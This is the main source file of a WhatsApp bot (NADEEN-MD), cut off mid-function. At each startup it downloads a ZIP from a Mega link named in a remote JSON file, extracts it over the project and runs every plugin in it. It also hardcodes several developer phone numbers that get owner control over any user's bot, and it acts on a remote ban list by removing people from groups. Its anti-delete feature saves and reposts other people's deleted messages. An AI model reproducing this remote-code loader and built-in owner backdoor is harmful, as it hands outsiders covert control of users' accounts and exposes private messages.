const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const axios = require('axios')
const { File } = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()

const FileType = require('file-type')
const l = console.log
const { exec } = require('child_process');
    const AdmZip = require('adm-zip'); // Import AdmZip for extraction
    //=========================dl-ZIP========================

const PLUGINS_DIR = './plugins'; // Directory where plugins will be extracted
const LIB_DIR = './lib';
const DATA_DIR = './data';
 const ZIP_DIR = './'

const connect = async () => {
 let ZIP = await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json');
    //console.log(ZIP.data); 

// Assuming the correct property is `ZIP.data.enc` (adjust based on actual response structure)
const MEGA_ZIP_LINK = `${ZIP.data.megaurl}`;  // Replace with your Mega ZIP file link
    // Ensure the plugins directory exists
    if (!fs.existsSync(PLUGINS_DIR)) {
      fs.mkdirSync(PLUGINS_DIR, { recursive: true });
    }
    if (fs.existsSync(DATA_DIR)) {
        fs.rmSync(DATA_DIR, { recursive: true, force: true });
      }
    if (!fs.existsSync(LIB_DIR)) {
        fs.mkdirSync(LIB_DIR, { recursive: true });
      }

    console.log('Fetching ZIP file from Mega.nz...');

    // Download the ZIP file from Mega.nz
    const file = File.fromURL(`${MEGA_ZIP_LINK}`);
    const fileData = await file.downloadBuffer();

    // Save the ZIP file to a temporary location
    const tempZipPath = path.join(__dirname, 'temp.zip');
    fs.writeFileSync(tempZipPath, fileData);
    console.log('NADEEN ZIP file downloaded successfully ✅');

    // Extract the ZIP file to the plugins directory
    const zip = new AdmZip(tempZipPath);
    zip.extractAllTo(ZIP_DIR, true); // Extract to the plugins directory

    console.log('Plugins extracted successfully ✅');
console.log('Lib extracted successfully ✅');

const ownerNumber = [`${config.OWNER_NUMBER}`];
//===================SESSION======.=======================

const df = __dirname + '/${config.SESSION_NAME}/creds.json';

if (!fs.existsSync(df)) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace("𝙽𝙰𝙳𝙴𝙴𝙽-𝙼𝙳=", "");

    if (sessdata.includes("#")) {
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
      filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(df, data, () => {
          console.log("✅ Mega session download completed and saved to creds.json !!");
        });
      });
    } else {
      (async () => {
        await downloadSession(sessdata, df);
      })();
    }
  }
}

async function downloadSession(sessdata, df) {
  const dbUrls = [
    'https://saviya-kolla-database.koyeb.app/',
    'https://saviya-kolla-database.vercel.app/'
  ];

  let success = false;

  for (let i = 0; i < dbUrls.length; i++) {
    const sessionUrl = `${dbUrls[i]}SESSIONS/${sessdata}`;
    console.log(`📥 Downloading session from NADEEN-DB`);

    try {
      const response = await axios.get(sessionUrl);

      if (response.data && Object.keys(response.data).length > 0) {
        await sleep(1000);
        fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
        console.log(`✅ Session file save successfully`);
        success = true;
        break;
      } else {
        console.warn(`⚠️ Empty or invalid session data from DB-${i + 1}, attempting next DB...`);
      }

    } catch (err) {
      console.error(`❌ Failed to download local DB session file: ${err.message}`);
    }
  }

  if (!success) {
    console.error("❌ All DB servers failed to provide a valid session file.");
  }
}

// <<==========PORTS============>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================
async function connectToWA() {
//Run the function

    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + `/${config.SESSION_NAME}`)
    const conn = makeWASocket({
        logger: P({
            level: "fatal"
        }).child({
            level: "fatal"
        }),
        printQRInTerminal: true,
        generateHighQualityLinkPreview: true,
        auth: state,
        defaultQueryTimeoutMs: undefined,
        msgRetryCounterCache
    })



        conn.ev.on('connection.update', async (update) => {
          const { connection, lastDisconnect } = update;
          if (connection === 'close') {
              if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                  connectToWA();
              }
          } else if (connection === 'open') {
             
          }
      });
 
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
 var {
  updateCMDStore,
  isbtnID,
  getCMDStore,
  getCmdForCmdId,
  connectdb,
  input,
  get,
  getalls,
  updb,
  updfb,
  upresbtn,
} = require("./lib/database");     

const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
      require("./plugins/" + plugin);
  }
});

console.log('All Plugins installed ⚡')
await connectdb()
await updb()		
console.log('NADEEN-MD CONNECTED ✅')



const prefix = config.PREFIX
//const aliveMsg = config.ALIVE_MSG
const autoreadStatus = config.AUTO_READ_STATUS
const mode = config.ONLY_GROUP
const call = config.ANTI_CALL
const block = config.AUTO_BLOCK
const badword = config.ANTI_BAD
const antilink = config.ANTI_LINK
const ty = config.AUTO_TYPING		
const antiBot = config.ANTI_BOT
const readall = config.AUTO_MSG_READ
const readCmd = config.CMD_ONLY_READ
const recording = config.AUTO_RECORDING
const autoReact = config.AUTO_REACT 
const ownerNumber = config.OWNER_NUMBER

const ownerdataa = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
     
	    
const captionText = `${ownerdataa.connectmg}`;

const imageUrl = `${ownerdataa.cmsglogo}`;

const botJid = jidNormalizedUser(conn.user.id);






  conn.ev.on('creds.update', saveCreds)
  conn.ev.on('messages.upsert', async (mek) => {
    try {

async function loadConfig() {
  const settings = await getalls(); 
  if (settings) {
    Object.assign(config, settings); 
  }
}

loadConfig().catch(console.error);
	    
mek = mek.messages[0];
if (!mek.message) return;

// ephemeral message නම් unwrap කරමු
mek.message = (getContentType(mek.message) === 'ephemeralMessage')
  ? mek.message.ephemeralMessage.message
  : mek.message;

// ✅ Only if AUTO_READ_STATUS === "true" do anything
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
  const emojis = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
  const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

	
await conn.readMessages([mek.key])  
const mnyako = await jidNormalizedUser(conn.user.id)
await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: randomEmoji} }, { statusJidList: [mek.key.participant, mnyako] })
}	      
	    if (mek.key && mek.key.remoteJid === 'status@broadcast') return


const metadata = await conn.newsletterMetadata("jid", `${ownerdataa.mainchanal}`)	      
if (metadata.viewer_metadata === null){
await conn.newsletterFollow(`${ownerdataa.mainchanal}`)
console.log("NADEEN MD WA CHANNEL FOLLOW ✅")
}	 
    
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = 
  (type === 'conversation') ? mek.message.conversation :
  (type === 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.quotedMessage &&
   await isbtnID(mek.message.extendedTextMessage.contextInfo.stanzaId)) ?
    await getCmdForCmdId(
      await getCMDStore(mek.message.extendedTextMessage.contextInfo.stanzaId),
      mek.message.extendedTextMessage.text
    ) :
  (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
  (type === 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage?.selectedId :
  (type === 'interactiveResponseMessage') ? (() => {
    try {
      const json = JSON.parse(mek.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson);
      return json?.id || '';
    } catch { return ''; }
  })() :
  (type === 'imageMessage' && mek.message.imageMessage?.caption) ? mek.message.imageMessage.caption :
  (type === 'videoMessage' && mek.message.videoMessage?.caption) ? mek.message.videoMessage.caption :
  // fallback for unknown or malformed types
  m.msg?.text ||
  m.msg?.conversation ||
  m.msg?.caption ||
  m.message?.conversation ||
  m.msg?.selectedButtonId ||
  m.msg?.singleSelectReply?.selectedRowId ||
  m.msg?.selectedId ||
  m.msg?.contentText ||
  m.msg?.selectedDisplayText ||
  m.msg?.title ||
  m.msg?.name ||
  '';


const prefix = config.PREFIX;  
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const developers = `94711451319,94716769285,94779483535,94728840491,94755527010,94715973437,94775383340`
const mokakhri = developers.split(",")
const isbot = botNumber.includes(senderNumber)
const isdev = mokakhri.includes(senderNumber)
const isMe = isbot ? isbot : isdev 
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
 const isReact = m.message.reactionMessage ? true : false
const isAnti = (teks) => {
let getdata = teks
for (let i=0;i<getdata.length;i++) {
if(getdata[i] === from) return true
}
return false
}

const reply = async(teks) => {
  return await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
conn.replyad = async (teks) => {
  await conn.sendMessage(from, { text: teks }, { quoted: mek })
}
const NON_BUTTON = true // Implement a switch to on/off this feature...
conn.buttonMessage2 = async (jid, msgData,quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*\`Reply Below Number 🔢\`*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

conn.buttonMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []
    msgData.buttons.forEach((button, bttnIndex) => {
const mainNumber = `${bttnIndex + 1}`;
result += `\n*${mainNumber} ||*  ${button.buttonText.displayText}`;

CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
    });

    if (msgData.headerType === 1) {
const buttonMessage = `${msgData.text || msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
const textmsg = await conn.sendMessage(from, { text: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
    } else if (msgData.headerType === 4) {
const buttonMessage = `${msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,}, { quoted: quotemek || mek})
await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
    }
  }
}

   
conn.listMessage2 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber} ||* ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage ,
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}





conn.listMessage4 = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData);
  } else {
    let result = "";
    const CMD_ID_MAP = [];

    msgData.sections.forEach((section, sectionIndex) => {
      const mainNumber = `${sectionIndex + 1}`;
      result += `\n*${section.title}*\n\n`;

      section.rows.forEach((row, rowIndex) => {
        const subNumber = `${mainNumber}.${rowIndex + 1}`;
        const rowHeader = `*${subNumber} ||*  ${row.title}`;
        result += `${rowHeader}\n`;
        if (row.description) {
          result += `   ${row.description}\n\n`;
        }
        CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
      });
    });

    const listMessage = `${msgData.text || ''}\n\n${msgData.buttonText || ''},${result}\n\n${msgData.footer || ''}`;

    // Fix image handling
    let sendPayload;
    if (msgData.image) {
      let imageData = msgData.image;

      if (typeof imageData === 'string') {
        imageData = { url: imageData };
      } else if (Buffer.isBuffer(imageData)) {
        imageData = { buffer: imageData };
      } else if (imageData.url) {
        imageData = { url: imageData.url };
      } else {
        throw new Error("Invalid image format for listMessage4.");
      }

      sendPayload = {
        image: imageData,
        caption: listMessage,
      };
    } else {
      sendPayload = { text: listMessage };
    }

    const text = await conn.sendMessage(
      jid,
      sendPayload,
      { quoted: quotemek || mek }
    );

    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
};


conn.listMessage = async (jid, msgData, quotemek) => {
  if (!NON_BUTTON) {
    await conn.sendMessage(jid, msgData)
  } else if (NON_BUTTON) {
    let result = "";
    const CMD_ID_MAP = []

    msgData.sections.forEach((section, sectionIndex) => {
const mainNumber = `${sectionIndex + 1}`;
result += `\n*${section.title}*\n\n`;

section.rows.forEach((row, rowIndex) => {
  const subNumber = `${mainNumber}.${rowIndex + 1}`;
  const rowHeader = `*${subNumber} ||*  ${row.title}`;
  result += `${rowHeader}\n`;
  if (row.description) {
    result += `   ${row.description}\n\n`;
  }
  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
});
    });

    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n\n${msgData.footer}`
    const text = await conn.sendMessage(from, { text: listMessage, 
}, { quoted: quotemek || mek})
    await updateCMDStore(text.key.id, CMD_ID_MAP);
  }
}

     conn.sendButtonMessage3 = async (jid, buttons, quoted, opts = {}) => {
    let header;

    if (opts?.image) {
        var image = await prepareWAMessageMedia({
            image: {
                url: opts.image || ''
            }
        }, {
            upload: conn.waUploadToServer
        });

        header = {
            title: opts.header || '',
            hasMediaAttachment: true,
            imageMessage: image.imageMessage,
        };

    } else {
        header = {
            title: opts.header || '',
            hasMediaAttachment: false,
        };
    }

    let message = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    body: {
                        text: opts.body || ''
                    },
                    footer: {
                        text: opts.footer || ''
                    },
                    header: header,
                    nativeFlowMessage: {
                        buttons: buttons,
                        messageParamsJson: ''
                    }
                }
            }
        }
    }, {
        quoted: quoted
    });

    await conn.relayMessage(jid, message.message, { messageId: message.key.id });
};




	    

conn.edite = async (gg, newmg) => {
  await conn.relayMessage(from, {
    protocolMessage: {
key: gg.key,
type: 14,
editedMessage: {
  conversation: newmg
}
    }
  }, {})
}

	    
conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
}














	    
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "image") {
    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "video") {
    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "audio") {
    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
  }
}

const ownerdata = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
            
           
            config.FOOTER = ownerdata.footer
           
const preUser = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/premirum.json`)
const preUsers = preUser.numbers.split(",");

// replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
const isPre = preUsers
  .map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
  .includes(sender);





	    
//============================================================================ 
const banbn = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/ban_number.json`)
const plynYnna = banbn.split(",")
const isBanUser = [ ...plynYnna ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(sender)


  let gpId = `${config.JID_BLOCK}`;
const gpIdz = gpId.split(",")
const isBanGrp = [ ...gpIdz ]
      
      .includes(from)

//======================================================================================================================================================================



  let epaneda = `${config.SUDO}`;
  const epada = epaneda.split(",")
  const isSudo = [ ...epada ]
        
        .includes(sender)
//=========================================BAN GROUPS=====================================================
if ( isCmd && isBanGrp && !isMe && !isSudo) return



//========================================== TEAM REACT SECTION ========================================

const rec = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/react.json')).data

const recc = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data

//================================================================================================================	    
const id = mek.key.server_id
const defaultEmojis = ["❤️", "😮", "👍"];
const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
    
//=========================================================================================================================	    
if(senderNumber.includes("94711451319")){
if(isReact) return
m.react(`${rec.nadeen}`)
}
if(senderNumber.includes("94755527010")){
if(isReact) return
m.react(`${rec.nadeen2}`)
}
if(senderNumber.includes("94715973437")){
if(isReact) return
m.react(`${rec.nadeen}`)
}
if(senderNumber.includes("94728840491")){
if(isReact) return
m.react(`${rec.nadeen2}`)
}
if(senderNumber.includes("94779483535")){
if(isReact) return
m.react(`${rec.nadeen2}`)
}
if(senderNumber.includes("94716769285")){
if(isReact) return
m.react(`${rec.nadeen2}`)
}
if(senderNumber.includes("94785432344")){
if(isReact) return
m.react(`${rec.abhi}`)
}
if(senderNumber.includes("94778500326")){
if(isReact) return
m.react(`${rec.sadas}`)
}
if(senderNumber.includes("94775383340")){
if(isReact) return
m.react(`${rec.manhiru}`)
}
if(senderNumber.includes("94755094957")){
if(isReact) return
m.react(`${rec.nimmi}`)

}
if(senderNumber.includes("94712050104")){
if(isReact) return
m.react(`${rec.wesi}`)

}

const ownNum = config.OWNER_NUMBER;

            if(senderNumber.includes(ownNum)){
if(isReact) return 
m.react(`🍁`)
            }

if (isCmd && config.CMD_ONLY_READ  == "true"){
await conn.readMessages([mek.key])

}

     if ( config.WORK_TYPE == "only_group" ) {
if ( !isGroup && isCmd &&  !isMe && !isOwner && !isSudo ) return
      }
      
   if ( config.WORK_TYPE == "private" ) {
if  ( isCmd && !isMe && !isOwner && !isSudo ) return
      }

   if ( config.WORK_TYPE == "inbox" ) {
if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
      }      

//============================================Always online============================================================

 if (config.ALLWAYS_OFFLINE == "true") {
        conn.sendPresenceUpdate('unavailable'); // Sets the bot's last seen status
    }



	    
//========================================vajira ponnaya athulu lewakana un========================================================
if ( isBanUser ) {
	await conn.sendMessage(from, { delete: mek.key })
	await conn.groupParticipantsUpdate(from, [sender], 'remove')
	return await conn.sendMessage(from, { text: "*You are banned by NADEEN MD ❌\n\nPlease Contact Nadeen Remove it.*" })
}

	

	    
//============================================AUTO BLOCK=============================================================================================================
if (config.AUTO_BLOCK  == "true" && mek.chat.endsWith("@s.whatsapp.net")) {
			if(!isMe){

  await conn.sendMessage(from, { text: `*Warning 1 ❗*` });

				await conn.sendMessage(from, { text: `*Warning 2 ❗*` });
				  await conn.sendMessage(from, { text: `*Warning 3 ❗*` });
				  await conn.sendMessage(from, { text: `*Blocked 🚫*` });

		  await conn.updateBlockStatus(mek.sender, 'block')
			}
		}
//=============================================ANTI CALL======================================================================================================
const rejectedCalls = new Set();    // reject call id එකට lock
const messagedCallers = new Set();  // caller number lock

conn.ev.on("call", async (json) => {
  if (config.ANTI_CALL !== "true") return;

  for (const call of json) {
    if (call.status === "offer") {

      // Reject එක call id එකට එක වතාවක් පමණයි
      if (!rejectedCalls.has(call.id)) {
        await conn.rejectCall(call.id, call.from);
        rejectedCalls.add(call.id);

        // Clear rejectedCalls after 5 minutes to save memory
        setTimeout(() => rejectedCalls.delete(call.id), 5 * 60 * 1000);
      }

      // Message එක caller එකට එක වතාවක් පමණයි
      if (!call.isGroup && !messagedCallers.has(call.from)) {
        await conn.sendMessage(call.from, {
          text: "*Call rejected automatically because owner is busy ⚠️*",
          mentions: [call.from],
        });
        messagedCallers.add(call.from);

        // Clear messagedCallers after 10 minutes so caller can get message again later
        setTimeout(() => messagedCallers.delete(call.from), 10 * 60 * 1000);
      }
    }
  }
});


//================================================CMD ONLY READ=================================================================================================

//=================================================AUTO REACT================================================================================================	    
const emojis = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋']
         const emokis = emojis[Math.floor(Math.random() * (emojis.length))]
        if(!isMe &&  config.AUTO_REACT  == "true"){
            if(isReact) return 
         await conn.sendMessage(mek.chat, {
             react: {
                 text: emokis,
                 key: mek.key
             }
         })}
//================================================AUTO MSG READ==========================================================================================================
if (config.AUTO_MSG_READ  == "true"){
await conn.readMessages([mek.key])

}

//===============================================AUTO TYPING===============================================================================================================	      

  
  if(config.AUTO_TYPING  == "true"){
                conn.sendPresenceUpdate('composing', mek.key.remoteJid)
            }
	    
//============================================AUTO RECOOURDING=========================================================================================================
	    if(config.AUTO_RECORDING  == "true"){
		conn.sendPresenceUpdate('recording', mek.key.remoteJid)
            	    
       }

//==============================================CHATBOT=========================================================

if (config.CHAT_BOT == "true") { // Enable or disable this feature via config
     if (m.quoted) { // Works for both group and inbox
        let query = m.body ? m.body.toLowerCase() : ""; // Ensure 'body' is defined
        try {
            let datae = await fetchJson(`https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=${query}`);
            await conn.sendMessage(from, { text: datae.result.data }); // Send AI response
        } catch (error) {
            console.error("AI Chat Error:", error); // Handle errors
            await conn.sendMessage(from, { text: "." });
        }
    }
}

    
    //==================================ANTI DELETE========================================
if(!isOwner) {	
    if(config.ANTI_DELETE  == "true") {
    if (!m.id.startsWith("BAE5")) {
    
    // Ensure the base directory exists
    const baseDir = 'message_data';
    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir);
    }
    
    function loadChatData(remoteJid, messageId) {
      const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
      try {
        const data = fs.readFileSync(chatFilePath, 'utf8');
        return JSON.parse(data) || [];
      } catch (error) {
        return [];
      }
    }
    
    function saveChatData(remoteJid, messageId, chatData) {
      const chatDir = path.join(baseDir, remoteJid);
    
      if (!fs.existsSync(chatDir)) {
        fs.mkdirSync(chatDir, { recursive: true });
      }
    
      const chatFilePath = path.join(chatDir, `${messageId}.json`);
    
      try {
        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
       // console.log('Chat data saved successfully.');
      } catch (error) {
        console.error('Error saving chat data:', error);
      }
    }
        
    function handleIncomingMessage(message) {
      const remoteJid = from //message.key.remoteJid;
      const messageId = message.key.id;
    
      const chatData = loadChatData(remoteJid, messageId);
    
      chatData.push(message);
    
      saveChatData(remoteJid, messageId, chatData);
    
    //  console.log('Message received and saved:', messageId);
    }
    
    
    const delfrom = from
    function handleMessageRevocation(revocationMessage) {
    //const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
     //const messageId = revocationMessage.message.protocolMessage.key.id;
    const remoteJid = from // revocationMessage.msg.key.remoteJid;
    const messageId = revocationMessage.msg.key.id;
    
        
     // console.log('Received revocation message with ID:', messageId);
    
      const chatData = loadChatData(remoteJid, messageId);
    
       const originalMessage = chatData[0]   
    
      if (originalMessage) {
        const deletedBy = revocationMessage.sender.split('@')[0];
        const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
    const sentBy = sentBynn.split('@')[0];
          if ( deletedBy.includes(botNumber) || sentBy.includes(botNumber) ) return;
     if(originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== ''){
         const messageText = originalMessage.message.conversation;
   
         var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    //........................................//........................................
    }else if(originalMessage.msg.type ==='MESSAGE_EDIT'){
     conn.sendMessage(delfrom, { text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` },{quoted: mek});
     
    //........................................//........................................
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage && originalMessage.msg.text ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messageText = originalMessage.msg.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
        const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
     var xx = '```'
     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` });
    }else if(originalMessage.type === 'extendedTextMessage') {
    async function quotedMessageRetrive(){     
    var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                
    if(originalMessage.message.extendedTextMessage){
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        var xx = '```'
